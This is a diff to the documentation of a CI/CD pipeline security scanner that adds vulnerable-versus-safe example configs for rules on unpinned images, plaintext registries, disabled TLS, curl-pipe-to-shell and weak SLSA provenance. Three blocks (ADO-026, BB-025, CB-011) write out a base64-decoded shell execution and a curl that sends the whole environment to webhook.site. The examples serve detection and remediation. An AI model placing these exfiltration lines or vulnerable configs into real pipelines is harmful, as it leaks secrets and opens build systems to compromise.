@@ -363,6 +363,35 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``AzureCLI@2`` resolves to whatever
+# Microsoft ships as version 2 at job-start time. A
+# Microsoft-pushed update silently changes the task body;
+# more importantly, custom Marketplace tasks at floating
+# major version are repointable by their publisher.
+steps:
+  - task: AzureCLI@2
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+
+# Safe: pin to a specific patch version (``AzureCLI@2.245.0``)
+# or use ``AzureCLI@2.x`` only for first-party Microsoft
+# tasks where Marketplace publish controls are stronger.
+# Renovate's azure-pipelines updater bumps these.
+steps:
+  - task: AzureCLI@2.245.0
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+```
+
 **Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }
@@ -386,6 +415,36 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.
 
 **Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a container resource pinned to a mutable
+# tag. The publisher (or anyone with publish access)
+# repoints the tag on the next refresh; every pipeline
+# run pulls the swap silently.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env:latest
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot's docker ecosystem bump the digest in PRs.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env@sha256:abc123...
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+```
 
 **Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -428,6 +487,29 @@ Every check that evidences this standard, rendered once with its detection mecha
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP. ``--trusted-host`` silences hash
+# verification for the named host, so an attacker on the
+# network path can swap wheels in flight.
+steps:
+  - bash: |
+      pip install \
+        --index-url http://internal-pypi.example.com/simple \
+        --trusted-host internal-pypi.example.com \
+        -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed in the agent's trust store.
+steps:
+  - bash: |
+      pip install \
+        --index-url https://internal-pypi.example.com/simple \
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -479,6 +561,27 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` disables
+# certificate verification for every subsequent npm call.
+# A network attacker MITMs the registry and ships
+# substituted tarballs that npm installs unverified.
+steps:
+  - bash: |
+      npm config set strict-ssl false
+      npm install
+
+# Safe: install the missing CA into the agent's trust
+# store and keep strict-ssl on.
+steps:
+  - bash: |
+      sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
+      sudo update-ca-certificates
+      npm install
+```
+
 **Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }
@@ -499,6 +602,36 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ref: refs/heads/main`` on a cross-repo
+# template is mutable. Whoever can push to ``main`` on
+# ``ci-templates`` ships code into every consumer's
+# pipeline on the next run.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: refs/heads/main
+steps:
+  - template: build.yml@templates
+
+# Safe: pin to a tag (immutable in Azure Repos when
+# branch policies enforce tag-protect) or a 40-char
+# commit SHA. Renovate's azure-pipelines updater bumps
+# these in reviewable PRs.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+steps:
+  - template: build.yml@templates
+```
+
 **Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }
@@ -513,6 +646,29 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a
+# known miner binary. A malicious PR (or compromised
+# co-maintainer) lands the payload in the pipeline file
+# itself; every subsequent run executes it.
+steps:
+  - bash: |
+      echo Z2g6Li4uIA== | base64 -d | sh
+      curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires here
+# it's either a compromise or a CTF fixture; treat as
+# incident response.
+steps:
+  - checkout: self
+  - bash: make build
+```
 
 **Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -534,6 +690,38 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``alpine:3.18`` is a mutable tag. The Alpine
+# maintainers (or a registry compromise / namespace hijack)
+# repoint the tag on the next 3.18.x point release; every
+# Workflow run after that pulls the new image without any
+# audit trail in the manifest.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata: { name: build }
+spec:
+  templates:
+    - name: build
+      container:
+        image: alpine:3.18
+        command: [./build.sh]
+
+# Safe: pin to the content-addressable digest. Renovate's
+# docker-tag ecosystem bumps the digest in reviewable PRs
+# so the pin doesn't drift behind security patches.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata: { name: build }
+spec:
+  templates:
+    - name: build
+      container:
+        image: alpine@sha256:abc123...
+        command: [./build.sh]
+```
+
 **Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).
 
 ### `ARGO-008`: Argo script source pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-008 }
@@ -545,6 +733,44 @@ Every check that evidences this standard, rendered once with its detection mecha
 **Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts both the network path
+# (any MITM substitutes the script) and the host (an
+# attacker-compromised installer endpoint silently serves
+# attacker code). The script runs as the workflow's pod,
+# inheriting every secret mounted into the container.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: install-cli
+      script:
+        image: alpine@sha256:abc123...
+        command: [sh]
+        source: |
+          curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source, then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: install-cli
+      script:
+        image: alpine@sha256:abc123...
+        command: [sh]
+        source: |
+          set -e
+          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          bash /tmp/cli.sh
+```
 
 **Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -608,6 +834,43 @@ Triggering this rule means the bytes of the runtime image were produced by a bui
 - [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
 - [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the SLSA provenance attestation names a
+# self-hosted builder whose isolation cannot be audited
+# publicly. The signed attestation only attests that *this*
+# builder produced the artifact; it doesn't guarantee the
+# build environment was hermetic. A compromised self-hosted
+# runner produces signed provenance for malicious bytes.
+{
+  "_type": "https://in-toto.io/Statement/v0.1",
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": {
+      "id": "https://internal-jenkins.example.com/jobs/build"
+    },
+    "buildType": "https://example.com/build-script@v1"
+  }
+}
+
+# Safe: rebuild via a recognized hosted CI builder that
+# enforces hermetic isolation (slsa-github-generator on a
+# GitHub-hosted runner, the canonical SLSA L3 producer).
+# Downstream verifiers can validate the builder URI against
+# a public allowlist and trust the isolation guarantee.
+{
+  "_type": "https://in-toto.io/Statement/v0.1",
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": {
+      "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"
+    },
+    "buildType": "https://github.com/slsa-framework/slsa-github-generator/container@v1"
+  }
+}
+```
+
 **Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).
 
 ### `ATTEST-002`: SLSA provenance source-repo claim is missing or unverifiable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-002 }
@@ -636,6 +899,45 @@ Fires when:
 
 - [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
 - [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``configSource.uri`` is empty (or 'unknown' /
+# 'n/a' / a placeholder). The trusted builder produced and
+# signed an attestation but the source-repo claim is
+# missing, so a downstream verifier can confirm WHO built
+# but not WHAT they built. The attestation is structurally
+# valid yet semantically empty.
+{
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
+    "invocation": {
+      "configSource": {
+        "uri": "",
+        "digest": {}
+      }
+    }
+  }
+}
+
+# Safe: concrete source-repo URI plus a commit-level
+# digest. Verifiers can now confirm the image was built
+# from the expected repository at the expected commit.
+{
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
+    "invocation": {
+      "configSource": {
+        "uri": "git+https://github.com/myorg/myrepo@refs/tags/v1.4.2",
+        "digest": { "sha1": "0123456789abcdef0123456789abcdef01234567" }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).
 
@@ -893,6 +1195,33 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
+# whatever the publisher's latest 1.x image is at job
+# start. A publisher takeover (compromised Atlassian
+# Marketplace account, leaked token) repoints the tag
+# silently; every consumer's pipeline executes the new
+# image on the next run.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1
+            variables: { ... }
+
+# Safe: pin to an exact version (``X.Y.Z``). Renovate /
+# Dependabot's bitbucket-pipe ecosystem bumps these in
+# reviewable PRs.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1.7.0
+            variables: { ... }
+```
+
 **Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }
@@ -945,6 +1274,31 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification on the
+# named host. A network attacker swaps wheels in flight.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pip install --index-url http://internal-pypi.example.com/simple \
+              --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA installed
+# in the image's trust store.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim@sha256:abc123...
+        script:
+          - pip install --index-url https://internal-pypi.example.com/simple \
+              --require-hashes -r requirements.txt
+```
+
 **Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }
@@ -995,6 +1349,34 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` / ``NODE_TLS_
+# REJECT_UNAUTHORIZED=0``) disables certificate
+# verification for the duration. A network attacker MITMs
+# the registry and ships substituted tarballs.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - npm config set strict-ssl false
+          - npm install
+
+# Safe: install the missing CA into the image's trust
+# store; keep strict-ssl on.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+          - update-ca-certificates
+          - npm install
+```
+
 **Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }
@@ -1020,6 +1402,32 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to a third-party webhook, or runs a
+# known miner binary. A malicious PR (or a compromised
+# maintainer) lands the payload in the pipeline file;
+# every subsequent build executes it.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo Z2g6Li4uIA== | base64 -d | sh
+          - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# base64 -d | sh pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+pipelines:
+  default:
+    - step:
+        script:
+          - make build
+```
+
 **Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }
@@ -1043,6 +1451,31 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 **Known false positives.**
 
 - Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: python:3.12-slim`` is a mutable
+# tag. Docker Hub's image team rebuilds it on every
+# Python point release; a publisher takeover ships code
+# into every Bitbucket pipeline that uses the tag.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pytest
+
+# Safe: pin to the content-addressable digest. The pin
+# documents which version the digest corresponded to so
+# bumps stay reviewable.
+pipelines:
+  default:
+    - step:
+        image: python@sha256:abc123...  # python:3.12.1-slim
+        script:
+          - pytest
+```
 
 **Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -1095,6 +1528,30 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker-compose#main`` resolves at agent
+# boot to whatever sits at the plugin repo's main branch.
+# A push to the plugin repo (legitimate maintainer commit,
+# leaked token, takeover) ships code into every Buildkite
+# job that uses the plugin.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#main:
+          run: app
+
+# Safe: pin to a release tag (or a 40-char commit SHA).
+# Renovate / Dependabot's buildkite-plugin ecosystem bumps
+# these in reviewable PRs so the pin doesn't drift.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#v4.13.0:
+          run: app
+```
+
 **Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }
@@ -1106,6 +1563,32 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts both the network path
+# (any MITM substitutes the script) and the host (a
+# compromised installer endpoint silently serves attacker
+# code). The script runs in the build's shell context.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh | bash
+      ./cli build
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source, then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+      echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+      bash /tmp/cli.sh
+      ./cli build
+```
 
 **Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -1207,6 +1690,37 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeArtifact repository wired to a public
+# upstream (npm.org / pypi.org / maven-central) without
+# allow-listing. Internal package names harvested from
+# repo manifests can be claimed on the public upstream
+# with a higher version; CodeArtifact resolves them via
+# the public upstream and ships attacker code to every
+# consumer (Birsan dependency confusion).
+import boto3
+ca = boto3.client('codeartifact')
+ca.create_repository(
+    domain='myorg', repository='shared',
+    upstreams=[{'repositoryName': 'public-pypi-store'}],
+    externalConnections=['public:pypi']
+)
+
+# Safe: drop the public external connection. Mirror only
+# the packages your org actually needs into a curated
+# internal upstream so an arbitrary public publisher
+# can't poison resolution.
+ca.delete_repository_permissions_policy(
+    domain='myorg', repository='shared'
+)
+ca.disassociate_external_connection(
+    domain='myorg', repository='shared',
+    externalConnection='public:pypi'
+)
+```
+
 **Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }
@@ -1230,6 +1744,37 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.
 
 **Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``buildspec`` is inline JSON on the
+# project, not sourced from a protected repo. Anyone
+# with ``codebuild:UpdateProject`` (or who can call the
+# console UI) can rewrite the build steps without a
+# code-review trail. CodeBuild then runs the rewritten
+# spec with the project's role.
+import boto3, json
+cb = boto3.client('codebuild')
+cb.update_project(
+    name='my-build',
+    source={'type': 'NO_SOURCE',
+            'buildspec': json.dumps({'phases': {'build': {'commands': ['malicious']}}})}
+)
+
+# Safe: source ``buildspec.yml`` from a protected repo
+# branch. Changes to the build then route through PR
+# review on the SCM side, and the AWS-side ``UpdateProject``
+# call no longer carries the build's logic.
+cb.update_project(
+    name='my-build',
+    source={
+        'type': 'GITHUB',
+        'location': 'https://github.com/myorg/myrepo.git',
+        'buildspec': 'ci/buildspec.yml'   # path in the repo
+    }
+)
+```
 
 **Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1256,6 +1801,33 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the project's buildspec carries indicators
+# of malicious activity — base64-decoded execution, exfil
+# to webhook.site, miner binaries. Either the buildspec
+# was poisoned via UpdateProject (CB-008) or pulled from
+# a compromised repo.
+# (current buildspec source)
+phases:
+  build:
+    commands:
+      - echo Z2g6Li4uIA== | base64 -d | sh
+      - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the buildspec does only what the build needs.
+# If a check fires here, treat as incident response:
+# rotate the project's role's credentials, audit recent
+# builds, identify the commit / UpdateProject call that
+# introduced the payload.
+phases:
+  build:
+    commands:
+      - make build
+      - aws s3 cp build/ s3://artifacts-bucket/ --recursive
+```
+
 **Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }
@@ -1268,6 +1840,27 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``circleci/aws-cli@volatile`` (or any non-
+# semver ref) resolves at config-process time to whatever
+# the orb publisher last pushed. A compromised publisher
+# ships malicious orb steps into every consumer's pipeline.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@volatile
+  python: circleci/python@dev:alpha
+
+# Safe: pin to an exact semver (``X.Y.Z``). Renovate's
+# circleci ecosystem updater bumps the pin in reviewable
+# PRs; ``@volatile`` and ``@dev:*`` never reach prod.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@4.1.3
+  python: circleci/python@2.1.1
+```
+
 **Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }
@@ -1277,6 +1870,31 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.
 
 **Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``cimg/python:3.12`` is a mutable tag.
+# CircleCI's image team rebuilds it on every Python
+# point release; a publisher compromise ships code into
+# every pipeline that uses the tag.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python:3.12
+    steps:
+      - run: pytest
+
+# Safe: pin to the content-addressable digest.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python@sha256:abc123...  # cimg/python:3.12.1
+    steps:
+      - run: pytest
+```
 
 **Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).
 
@@ -1319,6 +1937,38 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so a network attacker between the
+# runner and the registry can substitute the wheel.
+# ``--trusted-host`` silences the very error that would
+# have caught the swap.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url http://internal-pypi.example.com/simple \
+                      --trusted-host internal-pypi.example.com \
+                      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image trust store.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url https://internal-pypi.example.com/simple \
+                      --require-hashes -r requirements.txt
+```
 
 **Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).
 
@@ -1383,6 +2033,39 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
